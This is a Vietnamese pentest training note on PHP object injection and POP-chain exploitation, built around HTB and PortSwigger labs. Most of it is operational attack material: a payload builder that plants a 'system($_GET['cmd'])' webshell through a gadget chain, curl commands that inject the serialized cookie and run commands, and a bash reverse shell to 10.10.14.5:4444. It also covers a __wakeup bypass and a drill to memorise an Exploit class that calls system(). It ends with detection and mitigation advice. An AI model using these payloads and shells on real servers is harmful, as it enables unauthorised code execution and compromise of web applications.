---
title: "02. PHP Object Injection — POP Chain"
type: attack
tags: [pentest, deserialization, php, attack, lesson-02]
aliases: [PHP Object Injection, PHP Deserialization]
created: 2026-03-31
---

> **Prerequisites**: [[01-serialization-internals|01. Serialization Internals]]
> **Objectives**:
> - Hiểu tại sao unserialize() với user input dẫn đến RCE
> - Xây dựng POP chain thủ công từ source code
> - Khai thác magic method chain: __wakeup → __toString → __destruct
> - Thực hiện whitebox và blackbox exploit
>
---

## Điều kiện khai thác

> [!note] Điều kiện bắt buộc
> - Ứng dụng gọi `unserialize()` với dữ liệu do user kiểm soát (cookie, POST param, header)
> - Có ít nhất một class được define trong codebase với magic method chứa code nguy hiểm
> - Attacker có thể chèn serialized object của class đó
>
> [!tip] Điều kiện mở rộng (POP chain)
> Nhiều lúc không có class đơn nào đủ nguy hiểm — cần chain nhiều class qua nhau. Điều này gọi là Property-Oriented Programming (POP): mỗi object's property trỏ đến object khác, tạo chain từ entry point đến sink.
>
---

## Cơ chế tấn công

### Tại sao unserialize() nguy hiểm?

Khi PHP gọi `unserialize($data)`, nó:
1. Parse chuỗi bytes theo format PHP serialization
2. Tạo ra các object trong bộ nhớ với đúng class và properties
3. **Tự động gọi `__wakeup()`** nếu class có định nghĩa
4. Khi script kết thúc, tất cả object bị destroy → `__destruct()` tự động chạy

Điểm then chốt: PHP sẽ tạo object của **bất kỳ class nào** có trong codebase, không chỉ class mà developer mong đợi. Nếu ứng dụng có class `FileManager` với `__destruct()` xóa file theo property `$filename`, attacker chỉ cần gửi:

```yaml
O:11:"FileManager":1:{s:8:"filename";s:15:"/etc/important";}
```

### Anatomy của POP Chain

Một POP chain gồm ba thành phần:

**Entry gadget** — class có magic method tự động kích hoạt:
- `__wakeup()` → kích hoạt ngay khi unserialize
- `__destruct()` → kích hoạt khi script kết thúc (luôn chạy)

**Pivot gadgets** — các class trung gian kết nối entry đến sink:
- Một method của entry gọi method của object khác (qua property)
- Điều này tạo ra chain: A.__destruct() → B.__toString() → C.__get() → ...

**Sink gadget** — nơi code nguy hiểm thực sự chạy:
- `eval()`, `system()`, `exec()`, `file_put_contents()`, `include()`, `unlink()`

### Ví dụ vulnerable code đầy đủ

```php
<?php
// logger.php — entry gadget
class Logger {
    public $logFile;
    public $initMsg;
    public $exitMsg;

    public function __destruct() {
        // Nguy hiểm: ghi file theo property attacker-controlled
        file_put_contents($this->logFile, $this->initMsg . $this->exitMsg);
    }
}

// CustomTemplate — pivot gadget
class CustomTemplate {
    private $template_file_path;

    public function __construct(string $template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    public function __toString() {
        return file_get_contents($this->template_file_path);
    }
}

// index.php — entry point
$cookie = base64_decode($_COOKIE['session']);
$data = unserialize($cookie); // ← vulnerable!
```

Chain: `unserialize()` → `Logger.__destruct()` → `file_put_contents($this->logFile, $this->initMsg)` → write webshell

---

## Quy trình tấn công

**Môi trường giả định**: Source code accessible, PHP app với serialized cookie, target tại `http://target.htb`.

**Bước 1 — Xác nhận có unserialize() nhận user input**

Tìm trong source hoặc decode cookie:

```bash
# Decode cookie từ browser
echo "Tzo2OiJVc2VyIjox..." | base64 -d
# Nếu thấy "O:4:"User":..." → PHP serialized object
```

> **Expected output**: Chuỗi bắt đầu bằng `O:`, `a:`, `s:` → xác nhận PHP serialization.
>
**Bước 2 — Enumerate classes trong codebase**

Tìm tất cả magic methods:

```bash
# Tìm tất cả magic methods trong source
grep -rn "__wakeup\|__destruct\|__toString\|__invoke\|__get\|__set\|__call" /var/www/html/ --include="*.php"

# Tìm sink functions
grep -rn "eval\|system\|exec\|passthru\|file_put_contents\|include\|require" /var/www/html/ --include="*.php"
```

> **Expected output**: Danh sách files và line numbers chứa magic methods. Đây là danh sách gadget candidates.
>
**Bước 3 — Xây POP chain thủ công**

Ví dụ từ HTB BroScience: class `NotificationManager` → `AvatarInterface`:

```php
<?php
// Payload builder — chạy trên máy attacker
class NotificationManager {
    public $notifyMethods;
    public $user;

    public function __destruct() {
        // Gọi sendNotification trên mỗi method
        foreach ($this->notifyMethods as $method) {
            $method->sendNotification($this->user);
        }
    }
}

class AvatarInterface {
    public $imgPath;
    public $tmp;

    public function sendNotification($input) {
        // Sink: file_put_contents với attacker-controlled path!
        file_put_contents($this->imgPath, $this->tmp);
    }
}

// Xây chain
$avatar = new AvatarInterface();
$avatar->imgPath = "/var/www/html/uploads/shell.php";
$avatar->tmp     = "<?php system(\$_GET['cmd']); ?>";

$notif = new NotificationManager();
$notif->notifyMethods = [$avatar];

// Serialize và encode
$payload = base64_encode(serialize($notif));
echo $payload;
```

```bash
php build_payload.php
# Output: Tzo3OiJOb3RpZmljYXRpb25NYW5hZ2VyIjoy...
```

> **Expected output**: Base64 string sẵn sàng inject vào cookie.
>
**Bước 4 — Inject payload và verify**

```bash
# Gửi payload qua cookie
curl -s http://target.htb/dashboard \
  -H "Cookie: user_prefs=$(php build_payload.php)"

# Kiểm tra shell được tạo
curl -s "http://target.htb/uploads/shell.php?cmd=id"
```

> **Expected output**: `uid=33(www-data) gid=33(www-data) groups=33(www-data)` → RCE thành công.
>
**Bước 5 — Upgrade lên reverse shell**

```bash
# Tạo payload RCE đầy đủ
CMD='bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"'
curl -s "http://target.htb/uploads/shell.php?cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$CMD'))")"
```

---

## Biến thể & Bypass

### Bypass __wakeup() với CVE-2016-7124

Nếu class có `__wakeup()` thực hiện validation, có thể bypass trên PHP < 7.0.10:

```yaml
O:4:"User":3:{s:4:"name";s:5:"admin";...}
          ^-- số properties khai báo > số thực tế
```

Khi count properties trong serialized string > số thực tế trong class → PHP bỏ qua `__wakeup()`.

### Khai thác qua Private/Protected properties

PHP private properties serialize với null bytes:

```yaml
O:4:"User":1:{s:12:"\x00User\x00pass";s:6:"secret";}
                    ^-- \x00ClassName\x00propertyName
```

Khi gửi qua HTTP, null bytes cần URL-encode thành `%00`.

### Object của class không tồn tại → __PHP_Incomplete_Class

Nếu serialize một object của class không tồn tại trên server:

```php
$data = unserialize('O:12:"UnknownClass":0:{}');
// → __PHP_Incomplete_Class object
// Không trigger magic methods nhưng có thể dùng làm stepping stone
```

### Loose type comparison bypass

PHP có behavior đặc biệt với loose comparison (`==`):

```php
// PHP 7.x: "0" == false == null → true
// PHP: 0 == "any string" → true (PHP < 8.0)
// Exploit: nếu có password check: if ($password == $stored_hash)
// → gửi b:0 (boolean false) thay cho password string
```

---

## Cây quyết định

```mermaid
flowchart TD
    A[Tìm thấy unserialize() nhận user input?] -->|Có| B[Có source code không?]
    A -->|Không| Z1[Không exploit được theo hướng này]
    B -->|Có whitebox| C[Tìm magic methods nguy hiểm]
    B -->|Blackbox| D[Thử detect error messages]
    C -->|Tìm thấy __destruct với sink| E[Xây POP chain đơn giản]
    C -->|Chỉ có magic methods bình thường| F[Cần chain nhiều class]
    D -->|Server trả về class error| G[Biết class names → xây chain]
    D -->|Không có error| H[Dùng PHPGGC nếu biết framework]
    E --> I[Serialize + encode + inject]
    F --> I
    G --> I
    H --> I
    I -->|Thành công - RCE| J[Upgrade to reverse shell]
    I -->|Fail - check encode| K[Thử URL encode hoặc raw base64]
    K --> I
```

---

## Command Cheatsheet

**Decode và phân tích PHP serialized data**

```bash
# Decode base64 cookie
echo "COOKIE_VALUE" | base64 -d

# Phân tích format
echo 'O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:0;}' | php -r "var_dump(unserialize(file_get_contents('php://stdin')));"
```

**Tìm gadgets trong source**

```bash
# Magic methods
grep -rn "function __destruct\|function __wakeup\|function __toString\|function __invoke" . --include="*.php"

# Dangerous sinks
grep -rn "eval(\|system(\|exec(\|passthru(\|file_put_contents(\|include(" . --include="*.php"

# Chạy cả hai và cross-reference
```

**Build và inject payload**

```bash
# Build payload
php build_payload.php | base64

# URL-encode nếu cần
php build_payload.php | base64 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))"

# Inject via curl
curl -s http://target.htb/ -H "Cookie: session=PAYLOAD"

# Inject via POST
curl -s -X POST http://target.htb/api -d "data=PAYLOAD"
```

**Xử lý null bytes trong private properties**

```bash
# Encode null bytes cho HTTP
# \x00ClassName\x00property → %00ClassName%00property
python3 -c "
import pickle, base64
raw = b'\x00User\x00password'
print(raw.hex())  # 004361737345506173737...
"
```

---

## Daily Drill

**Thời gian**: 15–20 phút/ngày trong 10 ngày đầu.

**Drill 1 — Nhận biết PHP serialized data**
Mục tiêu: nhìn vào cookie hoặc POST param và ngay lập tức nhận ra PHP serialized format.

```bash
# Giải mã 5 cookies sau và xác định loại data:
echo "Tzo0OiJVc2VyIjoxOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30=" | base64 -d
echo "YToyOntpOjA7czozOiJmb28iO2k6MTtzOjM6ImJhciI7fQ==" | base64 -d
echo "czoxMjoiSGVsbG8gV29ybGQhIjs=" | base64 -d
```

Luyện cho đến khi: nhận ra `O:`, `a:`, `s:`, `b:` trong 3 giây.

**Drill 2 — Tìm gadgets nhanh**
Mục tiêu: grep source một lần, lọc ra được candidates trong dưới 2 phút.

```bash
# Chạy trên sample PHP app (DVWA hoặc bất kỳ PHP project nào)
grep -rn "function __destruct\|function __wakeup" . --include="*.php" | head -20
grep -rn "system(\|exec(\|eval(" . --include="*.php" | grep -v "//\|#" | head -20
```

Luyện cho đến khi: biết ngay cần grep gì, không cần nhìn cheatsheet.

**Drill 3 — Serialize/Deserialize cycle**
Mục tiêu: viết payload builder PHP script trong dưới 5 phút.

```php
<?php
class Exploit {
    public $cmd;
    public function __destruct() { system($this->cmd); }
}
$e = new Exploit();
$e->cmd = "id";
echo base64_encode(serialize($e));
```

Luyện cho đến khi: gõ script này từ bộ nhớ không cần nhìn mẫu.

---

## Phát hiện & Phòng thủ

> [!warning] Detection Indicators
> **Error logs**: `unserialize(): Error at offset X` — app nhận data không hợp lệ → ai đó đang probe
> **Anomalous cookies**: Cookie value bắt đầu bằng `O:` hoặc base64 decode ra `O:` — không phải JSON/JWT
> **Unusual class instantiation**: Logs cho thấy class không expected được tạo
> **File system changes**: Webshell xuất hiện trong upload directories
> **Outbound connections từ web process**: DNS queries, HTTP requests đến external — OOB test của attacker
>
> **SIEM rule**: Alert khi web process (apache/nginx/php-fpm) spawn child process (`system()`, `exec()`)
>
> [!note] Mitigation
> - **Không bao giờ** truyền `unserialize()` user input trực tiếp
> - Dùng JSON thay thế cho data exchange (không có code execution risk)
> - Nếu bắt buộc dùng serialize: implement HMAC signature và verify trước khi unserialize
> - Dùng `allowed_classes` parameter: `unserialize($data, ['allowed_classes' => ['SafeClass']])`
> - Giữ classes với magic methods trong isolated namespace; không include vào global scope
>
---

## Lab Thực hành

| Platform | Machine | Kỹ thuật cần dùng |
|----------|---------|------------------|
| HTB | **BroScience** (Retired) | Manual POP chain từ source code, custom serialized cookie |
| HTB | **Cronos** (Retired) | Laravel CVE-2018-15133 PHP deser (Beyond Root path) |
| PortSwigger | **PHP deserialization labs** | 5 labs từ basic đến custom gadget chain |
| Local | Custom vulnerable app (DVWA, WebGoat) | Practice craft payload từ đầu |

Làm theo thứ tự: PortSwigger labs → HTB BroScience.

---

## Field Manual Entry

> [!abstract] PHP Object Injection — Quick Reference
> **Điều kiện**: Source có `unserialize(user_input)`; có class với magic methods nguy hiểm
> **Lệnh nhanh**: `grep -rn "function __destruct\|function __wakeup" . --include="*.php"`
> **Build payload**: `echo base64_encode(serialize($exploit_obj));` trong PHP script
> **Inject**: `curl -H "Cookie: session=PAYLOAD" http://target.htb/`
> **Look for**: `O:` prefix trong decoded cookie; PHP class error messages
> **Detection**: Anomalous cookie format; web process spawning shell
> **Ref**: [[02-php-object-injection|02. PHP Object Injection]]